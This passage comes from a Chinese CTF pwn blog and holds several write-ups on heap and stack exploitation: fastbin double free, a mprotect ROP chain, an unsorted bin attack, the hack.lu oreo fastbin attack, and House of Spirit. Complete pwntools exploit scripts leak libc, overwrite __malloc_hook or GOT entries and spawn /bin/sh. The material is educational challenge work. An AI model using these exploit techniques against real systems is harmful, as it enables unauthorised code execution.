开始往前找，找啊找啊，找到一个0x7f，这个可以做chunksize, 它对应的是malloc_hook - 0x23， 所以我们的 fake_chunk = malloc_hook - 0x23就是这么来的。来看一下效果123456789100x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;: 0xfff7dd0260000000 0x000000000000007f &lt;-- chunksize0x7ffff7dd1afd: 0xfff7a92e20000000 0xfff7a92a0000007f0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;: 0x000000000000007f 0x00000000000000000x7ffff7dd1b1d: 0x0000000000000000 0x00000000000000000x7ffff7dd1b2d &lt;main_arena+13&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b3d &lt;main_arena+29&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b4d &lt;main_arena+45&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b5d &lt;main_arena+61&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b6d &lt;main_arena+77&gt;: 0x0000000000000000 0x55557571600000000x7ffff7dd1b7d &lt;main_arena+93&gt;: 0x0000000000000055 0x55557570b0000000fastbin double freefree掉chunk1以后修改其fd，让它的fd指向fakechunk，然后连续alloc两次就能拿到我们的fakechunk12345free(1)payload = 'a'*0x50 + p64(0) + p64(0x71) + p64(fake_chunk) +p64(0)fill(0,len(payload),payload)alloc(0x60)alloc(0x60)其实这里还有很多细节:一些细节我们在最开始的时候对于chunk1采用的alloc(0x40)，加上header也就是0x51,后来为了堆块重叠而进行了扩张，扩张了0x20，也就变成了0x71，再想想我们刚才在__malloc_hook附近找了许多字节，只有0x7f适合做fakechunk的chunksize，而当0x7f做chunksize的时候，其数据域的大小正好就是0x60，和我们扩张以后的chunk1的数据域大小保持一致，这为我们fastbin double free创造了条件(都在同一个fastbin链表中)。修改__malloc_hook 为execve(“/bin/sh”)如何获取execve(&quot;/bin/sh&quot;)？这里用到了one_gadget这四个选一个吧，不过我这四个里面只有0x4526a能用。。。然后就是偷梁换柱咯12payload = 'a'*3 + p64(0) + p64(0) + p64(libcbase + 0x4526a)fill(2,len(payload),payload)由于__malloc_hook附近是这种结构123memalign_hookrealloc_hookmalloc hook所以那两个p64(0)分别对应memalign_hook和realloc_hook。这样就能通过alloc一个chunk来触发malloc_hook里面我们修改的execve(“/bin/sh”)从而getshell了12alloc(0x30)#这个大小随意，别太离谱就行c.interactive()0x03 完整EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from pwn import *#context.log_level = 'debug'c = process('./babyheap')elf = ELF('./babyheap')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')#c = remote('node3.buuoj.cn',29105)def alloc(size): c.recvuntil('Command: ') c.sendline('1') c.recvuntil('Size: ') c.sendline(str(size))def fill(idx,size,cont): c.recvuntil('Command: ') c.sendline('2') c.recvuntil('Index: ') c.sendline(str(idx)) c.recvuntil('Size: ') c.sendline(str(size)) c.recvuntil('Content: ') c.sendline(cont)def free(idx): c.recvuntil('Command: ') c.sendline('3') c.recvuntil('Index: ') c.sendline(str(idx))def dump(idx): c.recvuntil('Command: ') c.sendline('4') c.recvuntil('Index: ') c.sendline(str(idx))alloc(0x50)alloc(0x40)alloc(0x80)alloc(0x10)#-----------leak libc-------------------payload = 'a'*0x50 + p64(0) + p64(0x71)fill(0,len(payload),payload)payload = 'a'*0x10 + p64(0) + p64(0x11111)fill(2,len(payload),payload)free(1)alloc(0x60)payload = 'a'*0x40 + p64(0) + p64(0x91)fill(1,len(payload),payload)free(2)dump(1)c.recvuntil('Content: \\n')main_arena = u64(c.recvuntil('\\n',drop = True)[-8:])log.success('main_arena + 88 = ' + hex(main_arena))'''pwndbg&gt; distance 0x7ffff7a0d000 0x7ffff7dd1b780x7ffff7a0d000-&gt;0x7ffff7dd1b78 is 0x3c4b78 bytes (0x7896f words)'''offset = 0x3c4b78libcbase = main_arena-offset#-------------choice fake_chunk --------------malloc_hook = libc.symbols[\"__malloc_hook\"]+libcbasefake_chunk = malloc_hook - 0x23log.success('fake_chunk = ' + hex(fake_chunk))#------------fastbin double free -------------free(1)payload = 'a'*0x50 + p64(0) + p64(0x71) + p64(fake_chunk) +p64(0)fill(0,len(payload),payload)alloc(0x60)alloc(0x60)#---------change __malloc_hook to execve(\"/bin/sh\") --------payload = 'a'*3 + p64(0) + p64(0) + p64(libcbase + 0x4526a)fill(2,len(payload),payload)#--------execve(\"/bin/sh\") by alloc -----------------alloc(0x30)c.interactive()0x04 参考链接CSDNCTF-WIKI看雪简书谢谢各位师傅们~通过这道题学到了很多。","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"get_started_3dsctf_2016","slug":"get-started-3dsctf-2016","date":"2020-02-25T14:11:45.000Z","updated":"2020-02-25T15:17:38.403Z","comments":true,"path":"2020/02/25/get-started-3dsctf-2016/","link":"","permalink":"http://liul14n.top/2020/02/25/get-started-3dsctf-2016/","excerpt":"","text":"0x00 前言这是BUUCTF上的一道只有1分的题目，本以为就是个简单的ROP，但是弄了半天打不通，最后借助大佬们的WP完成了这道题目，写此博客记录几个易错点。0x01 分析12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000)程序没开PIE和Canary。12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+4h] [ebp-38h] printf(\"Qual a palavrinha magica? \", v4); gets(&amp;v4); return 0;&#125;123456789101112131415161718192021222324252627void __cdecl get_flag(int a1, int a2)&#123; int v2; // eax int v3; // esi unsigned __int8 v4; // al int v5; // ecx unsigned __int8 v6; // al if ( a1 == 814536271 &amp;&amp; a2 == 425138641 ) &#123; v2 = fopen(\"flag.txt\", \"rt\"); v3 = v2; v4 = getc(v2); if ( v4 != 255 ) &#123; v5 = (char)v4; do &#123; putchar(v5); v6 = getc(v3); v5 = (char)v6; &#125; while ( v6 != 255 ); &#125; fclose(v3); &#125;&#125;可以看到在main函数存在明显的栈溢出，并且存在get_flag函数，但是该函数有一个if语句，不过我们可以绕过这个if验证。难点1main函数中v4距离返回地址多少个字节？在IDA中，可以看到对v4的描述如下1char v4; // [esp+4h] [ebp-38h]按照以往经验，可能会直接认为v4距离ebp有0x38个字节，所以距离返回地址有0x38+4个字节，但实际上并不是这样，来看main函数的汇编。这个程序不同于别的程序，在main函数的开始并没有push ebp; mov ebp,esp这种操作。这个程序的main栈帧(叫法可能不太准确?但是大体意思应该表达清楚了)并没有ebp，寻址方式是esp寻址。所以v4距离返回地址有0x38个字节，这一点确实困扰我好大一会0x02 Let’s do it!test.py1234567891011from pwn import *#c = process('./get')c = remote('node3.buuoj.cn',28831)c.recvuntil('Qual a palavrinha magica? ',timeout = 0.5)get_flag = 0x80489B8payload = 'a'*0x38 + p32(get_flag)c.sendline(payload)c.interactive()栈溢出覆盖eip本地可以打通，但是远程不可以，这里的get_flag是取的绕过if检测以后的那部分。test2.py这个方法运用了mprotect函数，这个函数也是这道题目的第二个重点。我是第一次接触这个函数，通过大佬们的博客也了解到了这个函数的功能以及用法。12#include &lt;sys/mman.h&gt;int mprotect(void *addr, size_t len, int prot);addr 我们要进行修改权限的地址len 是我们要修改的地址的长度prot 是我们想给从addr到addr + len 这段地址赋予的权限，就是rwx这三个权限，我们可以赋予这段地址rw(可读可写权限但不可执行)，也可以赋予r(仅可读)，也可以赋予rwx(可读可写可执行)。rwx 对应的是 7所以我们这个方法的目的就是借助这个函数，将一段地址的权限修改为可读可写可执行，然后在这段地址上写入shellcode，然后想办法控制eip到这段地址，从而执行shellcode。这段地址我们选择的是 bss = 0x80ea000这里执行2次rop，但是依然是本地可以打通，远程打不通。。。1234567891011121314151617181920212223242526from pwn import *c = process('./get')elf = ELF('./get')#c = remote('node3.buuoj.cn',29982)shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux') bss = 0x80ea000mprotect = elf.symbols['mprotect']read = elf.symbols['read']c.recvuntil('Qual a palavrinha magica? ',timeout = 0.5)payload = 'a'*0x38payload += p32(mprotect) + p32(main) + p32(bss) + p32(0x2000) + p32(7)c.sendline(payload)payload = 'a'*0x38payload += p32(read) + p32(bss) + p32(0) + p32(bss) + p32(0x100)c.sendline(payload)c.sendline(shellcode)c.interactive()exp.py既然两次rop打不通，那就试试一次吧。如何把2次rop变成一次rop？我们可以借助 pop..ret 来实现。注意到mprotect和read函数都是有3个参数，所以我们需要3次pop，一次ret的gadget。通过命令ROPgadget --binary get --only &#39;pop|ret&#39; |grep pop可以看到一大堆gadgets随便选一个含有3个pop和1个ret的就行。这里我们选择0x0806fc08 : pop esi ; pop ebx ; pop edx ; ret12345678910111213141516171819202122232425from pwn import *#c = process('./get')c = remote('node3.buuoj.cn',29982)elf = ELF('./get')shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux') bss = 0x80ea000ppp_ret = 0x0806fc08 #0x0806fc08 : pop esi ; pop ebx ; pop edx ; retmprotect = elf.symbols['mprotect']read = elf.symbols['read']payload = 'a'*0x38payload += p32(mprotect) + p32(ppp_ret) + p32(bss) + p32(0x2000) + p32(7)payload += p32(read) + p32(ppp_ret) + p32(0) + p32(bss) + p32(0x100) payload += p32(bss)sleep(0.5)c.sendline(payload)sleep(0.5)c.sendline(shellcode)c.interactive()家里网速最近不太好，没加sleep的时候一直打不通。。。还以为exp出问题了，调了半天才发现是网速问题。。。最后还是要感谢各位师傅们的博客","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"[Unsorted bin attack] lab14 magic heap","slug":"Unsorted-bin-attack-lab14-magic-heap","date":"2020-02-21T08:17:45.000Z","updated":"2020-02-21T13:21:45.622Z","comments":true,"path":"2020/02/21/Unsorted-bin-attack-lab14-magic-heap/","link":"","permalink":"http://liul14n.top/2020/02/21/Unsorted-bin-attack-lab14-magic-heap/","excerpt":"","text":"0x00 前言本文是根据CTF-WIKI上Unsorted bin attack相关内容来写的，用来巩固一下相关知识，并以一道例题练手。题目是HITCON Training lab14 magic heap:下载地址参考链接:CTF-WIKI某位师傅的博客0x01 知识回顾利用前提:能够控制 Unsorted Bin Chunk 的 bk 指针。利用效果:可以达到的效果是实现修改任意地址值为一个较大的数值。Unsorted bin 基本来源当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。Unsorted bin 使用情况Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取。在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。具体可以看下面的补充在malloc的时候，如果是在libc版本&lt;2.26的情况下，如果在fastbin，small bin中找不到对应大小的chunk时，会尝试在Unsorted Bin中遍历，在这个过程中，如果找到对应大小的chunk，则会直接返回给用户。否则会将这些chunk插入对应的bin中；在libc2.26之后，引入tcache内存管理机制，如果申请的chunk的大小不在fastbin范围内，并且在tcache中找不到对应大小的堆块，会尝试在Unsorted Bin中寻找，在遍历的过程中，就算找到符合大小的堆块也不会立即返回。会将找到的符合的chunk放入对应tcache bin中直到bin中chunk的个数达到上限7，或者Unsorted Bin遍历结束。在Unsorted Bin遍历结束之后会，若之前找到至少一个符合大小的chunk，返回tcache bin中的最后一个，否则返回null。注意这里，是插入到unsorted bin的头部，然后取的时候从链表尾取出，这里可以联系一下数据结构中带头节点的链表，应该对理解这一块有帮助。头结点其实就相当于unsorted_chunks(av)原理原理部分在CTF-WIKI里有相当详细的讲解。最核心的部分应该是这四行以及修改p的bk指针为目的地址target-0x10(64位是-0x10,32位-0x08)victim = unsorted_chunks(av)-&gt;bk=pbck = victim-&gt;bk=p-&gt;bk = target addr-16unsorted_chunks(av)-&gt;bk = bck=target addr-16bck-&gt;fd = *(target addr -16+16) = unsorted_chunks(av);这样也就将*target 的值修改为了unsorted bin 链表的头结点的地址了，这个地址往往是非常大的一个正数。利用场景我们通过修改循环的次数来使得程序可以执行多次循环。我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。0x02 题目分析这是一道很简单很适合练习Unsorted bin attack的题目12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000)题目提供了四个功能12341. Create a Heap 2. Edit a Heap 3. Delete a Heap 4. Exit漏洞点在edit_heap里面，这个函数能够实现任意字节的堆溢出。123456789101112if ( choice == 4869 )&#123; if ( (unsigned __int64)magic &lt;= 0x1305 ) &#123; puts(\"So sad !\"); &#125; else &#123; puts(\"Congrt !\"); l33t(); &#125;&#125;1234int l33t()&#123; return system(\"cat ./flag\");&#125;可以看到，如果我们的choice输入4869，程序会判断magic的大小是否小于等于0x1305,如果不小于，则执行l33t函数，这个函数能够cat flag。思路程序特别简单，我们只需要让magic大于0x1305就好，而我们的unsorted bin attack就能实现这个目的。创建3个chunk (其中chunk2是为了让chunk1与top chunk隔开)，delete掉chunk1，然后edit chunk0，通过堆溢出覆盖掉chunk1的bk，让bk为magic的地址-0x10，然后重新创建一个和chunk1大小一样的chunk。然后向程序输入4869、交互即可得到flag。0x03 完整EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *c = process('./magicheap')def create(size,cont): c.recvuntil('Your choice :') c.sendline('1') c.recvuntil('Size of Heap : ') c.sendline(str(size)) c.recvuntil('Content of heap:') c.send(cont)def edit(idx,size,cont): c.recvuntil('Your choice :') c.sendline('2') c.recvuntil('Index :') c.sendline(str(idx)) c.recvuntil('Size of Heap : ') c.sendline(str(size)) c.recvuntil('Content of heap : ') c.send(cont)def delete(idx): c.recvuntil('Your choice :') c.sendline('3') c.recvuntil('Index :') c.sendline(str(idx))magic = 0x6020C0create(0x20,'aaaa')create(0x80,'bbbb')# this size should not be in fastbinscreate(0x20,'cccc')delete(1)fd = 0bk = magic - 0x10payload = 'a'*0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk)edit(0,0x100,payload)create(0x80,'aaaa')c.recvuntil('Your choice :')c.sendline('4869')c.interactive()","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"[Fastbin Attack] 2014 hack.lu oreo","slug":"Fastbin-Attack-2014-hack-lu-oreo","date":"2020-02-19T19:08:36.000Z","updated":"2020-02-19T20:32:07.816Z","comments":true,"path":"2020/02/20/Fastbin-Attack-2014-hack-lu-oreo/","link":"","permalink":"http://liul14n.top/2020/02/20/Fastbin-Attack-2014-hack-lu-oreo/","excerpt":"","text":"0x00 前言这是一道CTF-WIKI对于Fastbin Attack的一道例题，本题利用的技术:堆溢出、Fastbin Attack、Arbitrary Alloc参考链接:CTF-WIKI看雪这里感谢看雪论坛和CTF-WIKI的师傅的详细讲解。题目下载地址:下载地址0x01 分析12345Arch: i386-32-littleRELRO: No RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000)程序功能及漏洞分析程序有6个基本功能1234561. Add new rifle2. Show added rifles3. Order selected rifles4. Leave a Message with your Order5. Show current stats6. Exit!在功能1. Add中12345678910111213141516171819202122232425unsigned int add()&#123; char *v1; // [esp+18h] [ebp-10h] unsigned int v2; // [esp+1Ch] [ebp-Ch] v2 = __readgsdword(0x14u); v1 = buf; buf = (char *)malloc(0x38u); if ( buf ) &#123; *((_DWORD *)buf + 13) = v1; //NextChunk指针 printf(\"Rifle name: \"); fgets(buf + 25, 56, stdin); sub_80485EC(buf + 25); // 将末尾换行符转换为\\x00 printf(\"Rifle description: \"); fgets(buf, 56, stdin); sub_80485EC(buf); ++riflesNum; &#125; else &#123; puts(\"Something terrible happened!\"); &#125; return __readgsdword(0x14u) ^ v2;&#125;可以看到,两次fgets都存在堆溢出，我们的name大小为27字节，description大小为25字节，但是却都允许输入56字节。堆块最后四个字节存放的是指向下一个堆块的指针，记为next。可以通过输入name来覆盖掉next。当前步枪总数riflesNum位于bss段。功能2show rifles能打印出当前添加的所有步枪的name和description功能3order rifles能够free掉所有add时申请的chunk，但是却没有置为NULL功能4leave message能够向0x0804A2A8处的指针所指向的地址写入128个字节，注意这里是不是往0x0804A2A8位置写数据，而是往0x0804A2A8里面存的指针所指向的位置写128个字节的数据。功能5show stats能够打印出当前add的数量和order的数量以及message(如果有的话)功能6 Exit退出程序分析完程序的功能了，可以发现漏洞点存在于add函数(堆溢出)和order函数(没置NULL)中。这里我们主要利用add函数里面的堆溢出，配合Fastbin Attack、Arbitrary Alloc。思路既然我们能够通过堆溢出覆盖掉next指针，那我们可以把next覆盖成任意值，也就能指向任意位置，也就能通过2.show函数打印出任意位置的内容，实现任意读。我们可以先通过这种这任意读来泄露libc地址，从而获得system函数地址。而我们的4. leave message函数能够向0x0804A2A8处的指针所指向的地址写入128个字节，那么我们可以想办法修改0x0804A2A8处的指针，然后就能实现任意写。可以通过这任意写来修改一些函数的got表，将其修改为system，进而想办法执行system(‘/bin/sh’)，从而getshell。这里还会有一些细节，等下会说。0x02 Let’s do it!前期模板123456789101112131415161718192021222324252627282930313233from pwn import *c = process('./oreo')elf = ELF('./oreo')libc = ELF('/lib/i386-linux-gnu/libc.so.6')#context.log_level = 'debug'def add(name,des): #c.recvuntil('Action',timeout = 0.5) c.sendline('1') #c.recvuntil('Rifle name',timeout = 0.5) c.sendline(name) #c.recvuntil('Rifle description',timeout = 0.5) c.sendline(des)def showrifles(): #c.recvuntil('Action: ',timeout = 0.5) c.sendline('2')def order(): #c.recvuntil('Action: ') c.sendline('3')def leavemsg(msg): #c.recvuntil('Action: ') c.sendline('4') #c.recvuntil('with your order: ') c.sendline(msg)def showstatus(): #c.recvuntil('Action: ') c.sendline('5')message = 0x0804a2a8比较诡异的是，如果加上了c.recvuntil，哪怕已经加上了timeout，程序也会卡住….看各位大佬的WP里面都没加recvuntil… 迷惑行为…Leak libcbase这里我们选择puts函数来进行泄露，这里有两个细节：第一：我们进行泄露的原理是： add一个步枪，通过堆溢出覆盖它的next为puts_got，然后show。也就是说，这样程序会把从puts_got开始的0x38个字节当做一个chunk，而由add函数申请的chunk最后四个字节是代表next的，我们需要确保我们所选择的用来泄露的函数其got表对应next的位置（也就是从这个函数got表开始的0x35~0x38字节的位置）的内容应该是0，这样当我们order(也就是delete)的时候，不会有多余的堆块被释放。第二：根据linux延迟绑定机制，只有第一次运行后got表才会绑定该函数的实际内存地址这里比较幸运，puts函数满足我们上面所说的小细节，而且程序一开始就已经调用过puts了。1234567891011121314# Leak puts_got = elf.got['puts']des = 'a'*25name = 'a'*27 + p32(puts_got)add(name,des)showrifles()c.recvuntil('Description: ')c.recvuntil('Description: ')puts_addr = u32(c.recv(4).ljust(4,'\\x00'))log.success('puts_addr = ' + hex(puts_addr))libcbase = puts_addr - libc.symbols['puts']system = libcbase + libc.symbols['system']想办法修改0x0804A2A8位置所存的指针我们可以通过把0x0804A2A8附近伪造成一个chunk，然后利用Arbitrary alloc技术修改其存放的指针。可以发现在 0x0804A2A8 - 4 = 0x0804A2A4 的位置存放的正好是当前add的步枪的总数而正常的chunk(32位)，在data区-4的位置，存放的正好就是chunk的size由于Arbitrary alloc技术必然要先经过free掉这个伪造chunk，而程序的add功能申请的chunk的大小是0x38,加上chunk_head就是0x40大小，那么我们就把这个伪造chunk的size也设置成0x40就好了，设置的方法也很简单，总共add 40次就行了。这里有个细节：为了我们执行order函数时不把那些不必要的chunk也都free进fastbin，我们把这些为了凑数而申请的chunk的next都覆盖成012for i in range(0x40 - 1 - 1): add('a'*27 + p32(0) ,str(i))注意这里 0x40-1-1，因为最开始已经add了一个了，而且待会我们还要再add一个起关键功能的chunk，所以这里是0x40-1-1我们还需要一个chunk来指向我们的伪造chunk，不然执行order的时候…伪造chunk不会被free进fastbin12payload = 'b'*27 + p32(message)add(payload,'b')算上刚刚这个，正好0x40个。由于Arbitrary alloc技术还需要和伪造chunk物理相邻的下一个chunk的size满足不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem，我们来看0x0804A2A8的位置在最开始存的指针是指向0x0804A2C0的，那么我们可以先leave message来修改伪造chunk的nextchunk（实际上这也是个伪造chunk，不是个真的chunk..）的size0x0804A2C0 - 0x0804A2A8 = 24，也就是说有24个字节的间隔。而伪造chunk的大小是0x38我们0x38 - 24 = 0x20，我们只需要写0x20字节来先填充伪造chunk，然后就能修改nextchunk的prevsize和size了。12345msg = 'a'*((0x38 - (0xc0 - 0xa8)) - 4) #paddingmsg += p32(0) #fake_chunk's nextPtrmsg += 'prev' #prev_sizemsg += p32(64) #nextchunk's size leavemsg(msg)这个size只要满足不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem就行。构造完毕，我们来order一下order函数比较巧妙，它会先free掉我们第0x40个add的chunk，然后根据第0x40个chunk的next找到我们的fakechunk再free掉，然后依次根据next找下去，可惜我们构造的fakechunk的next为0，这样方便再malloc。来看一下结果123456789pwndbg&gt; fastbinfastbins0x10: 0x00x18: 0x00x20: 0x00x28: 0x00x30: 0x00x38: 0x00x40: 0x804a2a0 —▸ 0x804d3d0 ◂— 0x0可以看到我们伪造的fakechunk已经进入fastbin了，当我们再次add的时候会在原位置得到这个堆块，进而可以修改里面的内容。 咱们的目的是修改0x0804A2A8位置存放的指针。为了方便getshell，我们这里选择了strlen函数，因为在sub_80485EC这个函数里面调用了它，比较好利用。那么我们把0x0804A2A8存放的指针改成strlen_got吧12payload = p32(elf.got['strlen'])add('padding',payload)getshell然后我们把strlen改成system吧这里有大佬一气呵成，修改成system的同时也给它传入了参数/bin/sh,因为leavemessage函数里面也用了strlen函数这是我目前凭自己想不到的一点，还是太菜了。。。先列一下大佬的方法吧12leavemsg(p32(system) + ';/bin/sh\\x00')c.interactive()而我的方法比较笨一些，先将strlen修改成system，然后再add一个，在name或者description位置传入/bin/sh1234leavemsg(p32(system))add('/bin/sh\\x00','/bin/sh\\x00')c.interactive()0x03 完整EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *c = process('./oreo')elf = ELF('./oreo')libc = ELF('/lib/i386-linux-gnu/libc.so.6')#context.log_level = 'debug'def add(name,des): #c.recvuntil('Action',timeout = 0.5) c.sendline('1') #c.recvuntil('Rifle name',timeout = 0.5) c.sendline(name) #c.recvuntil('Rifle description',timeout = 0.5) c.sendline(des)def showrifles(): #c.recvuntil('Action: ',timeout = 0.5) c.sendline('2')def order(): #c.recvuntil('Action: ') c.sendline('3')def leavemsg(msg): #c.recvuntil('Action: ') c.sendline('4') #c.recvuntil('with your order: ') c.sendline(msg)def showstatus(): #c.recvuntil('Action: ') c.sendline('5')message = 0x0804a2a8 puts_got = elf.got['puts']des = 'a'*25name = 'a'*27 + p32(puts_got)add(name,des)showrifles()c.recvuntil('Description: ')c.recvuntil('Description: ')puts_addr = u32(c.recv(4).ljust(4,'\\x00'))log.success('puts_addr = ' + hex(puts_addr))libcbase = puts_addr - libc.symbols['puts']system = libcbase + libc.symbols['system']for i in range(0x40 - 1 - 1): add('a'*27 + p32(0) ,str(i))payload = 'b'*27 + p32(message)add(payload,'b')msg = 'a'*((0x38 - (0xc0 - 0xa8)) - 4) + p32(0) + 'prev' + p32(64)leavemsg(msg)order()payload = p32(elf.got['strlen'])add('b',payload)#leavemsg(p32(system) + ';/bin/sh\\x00')leavemsg(p32(system))add('/bin/sh\\x00','/bin/sh\\x00')c.interactive()","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"[HOS]LCTF2016-pwn200","slug":"HOS-LCTF2016-pwn200","date":"2020-02-16T19:22:52.000Z","updated":"2020-02-18T17:39:39.609Z","comments":true,"path":"2020/02/17/HOS-LCTF2016-pwn200/","link":"","permalink":"http://liul14n.top/2020/02/17/HOS-LCTF2016-pwn200/","excerpt":"","text":"0x00 前言本文是对CTF-WIKI中House Of Spirit的一道例题的解析，这道题费了不小功夫，也算是弄明白了。参考链接:安全客官方WPCTF-WIKI题目下载地址:下载地址0x01 温习什么是House of SpiritHouse of Spirit 是 the Malloc Maleficarum 中的一种技术。该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。fake chunk 地址需要对齐， MALLOC_ALIGN_MASKfake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem。fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。利用场景（1）想要控制的目标区域的前段空间与后段空间都是可控的内存区域一般来说想要控制的目标区域多为返回地址或是一个函数指针，正常情况下，该内存区域我们输入的数据是无法控制的，想要利用hos攻击技术来改写该区域，首先需要我们可以控制那片目标区域的前面空间和后面空间，示意图如下。（2）存在可将堆变量指针覆盖指向为可控区域，即上一步中的区域利用思路（1）伪造堆块hos的主要意图就是在可控1及可控2构造好数据，将它伪造成一个fastbin。（2）覆盖堆指针指向上一步伪造的堆块。（3）释放堆块，将伪造的堆块释放入fastbin的单链表里面。（4）申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的。0x02 分析123456Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x400000)RWX: Has RWX segments主要保护都关了，可以执行shellcode。漏洞点1sub_400A8E函数中1234567891011121314151617181920int sub_400A8E()&#123; signed __int64 i; // [rsp+10h] [rbp-40h] char v2[48]; // [rsp+20h] [rbp-30h] puts(\"who are u?\"); for ( i = 0LL; i &lt;= 47; ++i ) &#123; read(0, &amp;v2[i], 1uLL); if ( v2[i] == 10 ) &#123; v2[i] = 0; break; &#125; &#125; printf(\"%s, welcome to xdctf~\\n\", v2); puts(\"give me your id ~~?\"); MyRead(); return sub_400A29();&#125;存在off-by-one漏洞。当输入48个字符的时候，会连带着将RBP里的值打印出来。这是因为read函数读取字符串的时候不会在末尾加上\\x00漏洞点2sub_400A29函数中123456789101112int sub_400A29()&#123; char buf; // [rsp+0h] [rbp-40h] char *dest; // [rsp+38h] [rbp-8h] dest = (char *)malloc(0x40uLL); puts(\"give me money~\"); read(0, &amp;buf, 0x40uLL); strcpy(dest, &amp;buf); ptr = dest; return sub_4009C4();&#125;由于buf的大小只有 0x40-0x8 = 0x38，但是却读入了0x40字节，会覆盖掉dest的指针，而dest是一个堆指针，这样就满足了HOS利用条件之一存在可将堆变量指针覆盖指向为可控区域小细节漏洞2满足了HOS利用条件之一，实际上另一个利用条件在sub_400A8E函数输入ID的地方也得到了满足，只是由于IDA反编译的一些问题，没有显示出来，但是从汇编界面看的话能够看到程序将rax(里面存放的Myread函数的返回值，也就是咱们输入的ID)里的值存放到了rbp-0x38的位置。每个栈帧的大小可以通过IDA查看，例如下图就是sub_400A8E函数的栈帧，也能看出来它栈帧大小是0x50从整个程序的栈结构来看:123456789101112131415161718192021+------------+----- -| ... | money(0x38) 实际读入0x40，能覆盖dest ↑+------------+ sub_400A29栈帧(0x40)| dest | ↓+------------+----- -| rbp |+------------+| rip |+------------+----- -| ... |这里占0x18,是别的东西↑+------------+ || ID | sub_400A8E栈帧(0x50)+------------+ || ... | name(0x30) ↓+------------+----- -| rbp | #这个rbp存的值实际上就是下面的rbp_addr，也就是main函数的栈底+------------+| rip |+------------+-----| ... | main栈帧(0x10)+------------+&lt;----rbp_addr也就是形成了这种格局。其他功能1234567891011121314151617181920212223int sub_4009C4()&#123; int v0; // eax while ( 1 ) &#123; while ( 1 ) &#123; menu(); v0 = MyRead(); if ( v0 != 2 ) break; checkout(); &#125; if ( v0 == 3 ) break; if ( v0 == 1 ) checkin(); else puts(\"invalid choice\"); &#125; return puts(\"good bye~\");&#125;12345678910111213141516int checkin()&#123; size_t nbytes; // [rsp+Ch] [rbp-4h] if ( ptr ) return puts(\"already check in\"); puts(\"how long?\"); LODWORD(nbytes) = MyRead(); if ( (signed int)nbytes &lt;= 0 || (signed int)nbytes &gt; 128 ) return puts(\"invalid length\"); ptr = malloc((signed int)nbytes); printf(\"give me more money : \"); printf(\"\\n%d\\n\", (unsigned int)nbytes); read(0, ptr, (unsigned int)nbytes); return puts(\"in~\");&#125;12345678910111213void checkout()&#123; if ( ptr ) &#123; puts(\"out~\"); free(ptr); ptr = 0LL; &#125; else &#123; puts(\"havn't check in\"); &#125;&#125;程序依然提供checkin、checkout、exit函数。思路将shellcode.ljust(48,’a’)输入到name中，通过off-by-one漏洞打印出来main函数栈底，通过上面结构图能够算出shellcode的地址，选取一个处在money中的位置作为fake_chunk在money中伪造堆块size，在id里面输入的是下一个堆块的size(大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem)，同时通过堆溢出漏洞覆盖掉destfree掉刚才伪造的堆块，使其进入fastbin申请堆块，申请出来以后还是在老位置。输入数据到刚申请的堆块中，覆盖掉rip，让其指向shellcode，完成劫持，执行shellcode。0x03 Let’s do it!shellcode可以选用现成的，也可以通过pwntools的shellcraft生成。1234shellcode = 